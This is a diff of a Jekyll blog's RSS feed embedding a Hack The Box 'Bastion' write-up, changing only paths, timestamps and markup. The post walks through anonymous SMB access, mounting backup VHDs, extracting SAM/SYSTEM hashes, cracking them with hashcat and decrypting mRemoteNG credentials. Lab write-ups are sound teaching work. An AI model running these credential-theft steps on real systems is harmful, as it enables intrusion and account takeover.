@@ -5,8 +5,8 @@
     <description>A blog</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Wed, 25 Sep 2019 21:48:46 -0400</pubDate>
-    <lastBuildDate>Wed, 25 Sep 2019 21:48:46 -0400</lastBuildDate>
+    <pubDate>Wed, 25 Sep 2019 22:36:30 -0400</pubDate>
+    <lastBuildDate>Wed, 25 Sep 2019 22:36:30 -0400</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
       <item>
@@ -15,7 +15,7 @@
 
 &lt;h1 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h1&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-22 08:26 EDT
 Nmap scan report for 10.10.10.134
 Host is up (0.053s latency).
@@ -60,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds&lt;/code&gt;&lt;/pr
 
 &lt;p&gt;It’s always worth testing to see if SMB permits null (aka anonymous) sessions. &lt;strong&gt;We need a share&lt;/strong&gt; to try authenticating to first. So we list out the shares.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# smbclient -L \\10.10.10.134
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# smbclient -L \\10.10.10.134
 Enter WORKGROUP\root's password:
     Sharename       Type      Comment                                                                                           
     ---------       ----      -------                                                                                           
@@ -70,9 +70,9 @@ Enter WORKGROUP\root's password:
     IPC$            IPC       Remote IPC 
     &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ADMIN$&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;IPC$&lt;/code&gt; are all default shares. &lt;code class=&quot;highlighter-rouge&quot;&gt;Backups&lt;/code&gt; is the only one that stands out. I attempt to authenticate to it with no credentials.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ADMIN$&lt;/code&gt;, &lt;code&gt;C$&lt;/code&gt;, and &lt;code&gt;IPC$&lt;/code&gt; are all default shares. &lt;code&gt;Backups&lt;/code&gt; is the only one that stands out. I attempt to authenticate to it with no credentials.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# smbclient \\\\10.10.10.134\\Backups
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# smbclient \\\\10.10.10.134\\Backups
 Enter WORKGROUP\root's password:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&amp;gt; dir
@@ -84,9 +84,9 @@ smb: \&amp;gt; dir
 
                 7735807 blocks of size 4096. 2745314 blocks available&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Our null session worked. We have read access to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Backups&lt;/code&gt; share.&lt;/p&gt;
+&lt;p&gt;Our null session worked. We have read access to the &lt;code&gt;Backups&lt;/code&gt; share.&lt;/p&gt;
 
-&lt;p&gt;Although there aren’t that many files in the share, some are massive. Here’s a quick look of the interesting directory &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowsImageBackup&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Although there aren’t that many files in the share, some are massive. Here’s a quick look of the interesting directory &lt;code&gt;WindowsImageBackup&lt;/code&gt;.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\&amp;gt; dir
   .                                   D        0  Fri Feb 22 07:45:32 2019                                                          
@@ -97,28 +97,28 @@ smb: \&amp;gt; dir
                                                             
   &amp;lt; . . . snip . . . &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;VHD files? Definitely something to look at. But &lt;code class=&quot;highlighter-rouge&quot;&gt;5418299392&lt;/code&gt; blocks? That’s over &lt;em&gt;two terabytes&lt;/em&gt;. We need a way to enumerate the VHDs without downloading them entirely.&lt;/p&gt;
+&lt;p&gt;VHD files? Definitely something to look at. But &lt;code&gt;5418299392&lt;/code&gt; blocks? That’s over &lt;em&gt;two terabytes&lt;/em&gt;. We need a way to enumerate the VHDs without downloading them entirely.&lt;/p&gt;
 
 &lt;h1 id=&quot;mounting-shares-and-vhd-files&quot;&gt;Mounting shares and VHD files&lt;/h1&gt;
 
 &lt;p&gt;If we mount the share, we can view it as if it were part of our own file system.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
 Password for anonymous@//10.10.10.134/Backups:  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/bastion/image2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Those juicy VHD files, though, aren’t readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install &lt;code class=&quot;highlighter-rouge&quot;&gt;guestmount&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Those juicy VHD files, though, aren’t readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install &lt;code&gt;guestmount&lt;/code&gt;.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# apt-get install libguestfs-tools&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# apt-get install libguestfs-tools&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Then we create a new directory as the mountpoint.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# mkdir vhd1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# mkdir vhd1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;And we mount the VHD file.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# guestmount --add &quot;/root/HTB/Bastion/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd&quot; --inspector --ro /root/HTB/Bastion/vhd1 -v&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# guestmount --add &quot;/root/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd&quot; --inspector --ro /root/vhd1 -v&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Now we can browse through the file system as if it were part of our own.&lt;/p&gt;
 
@@ -126,15 +126,15 @@ Password for anonymous@//10.10.10.134/Backups:  &lt;/code&gt;&lt;/pre&gt;&lt;/fi
 
 &lt;p&gt;&lt;em&gt;Note: One of the VHD files wouldn’t mount properly. Turns out it isn’t necessary to mount anyway.&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;Now with read access to the VHD, my first instinct is to go for the &lt;strong&gt;flags&lt;/strong&gt;, but there’s nothing at &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\L4mpje\Desktop&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Administrator\Desktop&lt;/code&gt;. So we clearly don’t have the right access just yet.&lt;/p&gt;
+&lt;p&gt;Now with read access to the VHD, my first instinct is to go for the &lt;strong&gt;flags&lt;/strong&gt;, but there’s nothing at &lt;code&gt;C:\Users\L4mpje\Desktop&lt;/code&gt; or &lt;code&gt;C:\Users\Administrator\Desktop&lt;/code&gt;. So we clearly don’t have the right access just yet.&lt;/p&gt;
 
 &lt;p&gt;Next thing to do would be to search for &lt;strong&gt;user credentials&lt;/strong&gt; (remember the open SSH port?). After we’ve checked for credentials lying around in obvious places, it makes sense to try accessing the SAM and SECURITY files.&lt;/p&gt;
 
 &lt;h1 id=&quot;sam-and-security&quot;&gt;SAM and SECURITY&lt;/h1&gt;
 
-&lt;p&gt;Depending on your version of Windows, these can be in a few different locations. Here, they’re in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\config&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Depending on your version of Windows, these can be in a few different locations. Here, they’re in &lt;code&gt;C:\Windows\System32\config&lt;/code&gt;.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# dir
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/vhd1/Windows/System32/config# dir
 &amp;lt; . . . snip . . . &amp;gt;
 SAM
 SAM.LOG
@@ -145,26 +145,26 @@ SECURITY
 
 &lt;p&gt;I copy them from the mounted drive to my Kali box.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SAM /root/HTB/Bastion
-root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SYSTEM /root/HTB/Bastion&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/vhd1/Windows/System32/config# cp SAM ~
+root@kali:~/vhd1/Windows/System32/config# cp SYSTEM ~&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;To get the hashes, I use &lt;code class=&quot;highlighter-rouge&quot;&gt;samdump2&lt;/code&gt; and pass the &lt;code class=&quot;highlighter-rouge&quot;&gt;SYSTEM&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SAM&lt;/code&gt; files as arguments.&lt;/p&gt;
+&lt;p&gt;To get the hashes, I use &lt;code&gt;samdump2&lt;/code&gt; and pass the &lt;code&gt;SYSTEM&lt;/code&gt; and &lt;code&gt;SAM&lt;/code&gt; files as arguments.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# samdump2 SYSTEM SAM -o hashes.txt
-root@kali:~/HTB/Bastion# cat hashes.txt
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# samdump2 SYSTEM SAM -o hashes.txt
+root@kali:~# cat hashes.txt
 *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;The L4mpje hash takes seconds to crack with &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The L4mpje hash takes seconds to crack with &lt;code&gt;hashcat&lt;/code&gt;.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;The password for use L4mpje is &lt;strong&gt;bureaulampje&lt;/strong&gt;. The Administrator and Guest account hashes are marked as &lt;code class=&quot;highlighter-rouge&quot;&gt;*disabled*&lt;/code&gt;, so this is the best we’ll get.&lt;/p&gt;
+&lt;p&gt;The password for use L4mpje is &lt;strong&gt;bureaulampje&lt;/strong&gt;. The Administrator and Guest account hashes are marked as &lt;code&gt;*disabled*&lt;/code&gt;, so this is the best we’ll get.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/bastion/image4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;To get in, we &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; as &lt;strong&gt;L4mpje@10.10.10.134&lt;/strong&gt; with the recovered password.&lt;/p&gt;
+&lt;p&gt;To get in, we &lt;code&gt;ssh&lt;/code&gt; as &lt;strong&gt;L4mpje@10.10.10.134&lt;/strong&gt; with the recovered password.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# ssh L4mpje@10.10.10.134
 L4mpje@10.10.10.134's password: 
@@ -181,7 +181,7 @@ l4mpje@BASTION C:\Users\L4mpje&amp;gt;    &lt;/code&gt;&lt;/pre&gt;&lt;/figure&g
 
 &lt;h1 id=&quot;privilege-escalation-mremoteng-credentials&quot;&gt;Privilege Escalation: mRemoteNG Credentials&lt;/h1&gt;
 
-&lt;p&gt;With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is insatlled. Here, &lt;code class=&quot;highlighter-rouge&quot;&gt;mRemoteNG&lt;/code&gt; stands out.&lt;/p&gt;
+&lt;p&gt;With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is insatlled. Here, &lt;code&gt;mRemoteNG&lt;/code&gt; stands out.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;l4mpje@BASTION C:\&amp;gt;dir &quot;Program Files (x86)&quot;                                    
  Volume in drive C has no label.                                                
@@ -222,7 +222,7 @@ l4mpje@BASTION C:\Users\L4mpje&amp;gt;    &lt;/code&gt;&lt;/pre&gt;&lt;/figure&g
 
 &lt;p&gt;What worked best for me was &lt;a href=&quot;https://github.com/haseebT/mRemoteNG-Decrypt&quot;&gt;mRemoteNG_Decrypt.py&lt;/a&gt;. I copied the encrypted password and passed it as a string to get the plaintext credential.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Bastion# python3 mremoteng_decrypt.py -s &quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# python3 mremoteng_decrypt.py -s &quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;
 Password: thXLHM96BeKL0ER2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;From here, we simply have to SSH in as Administrator.&lt;/p&gt;
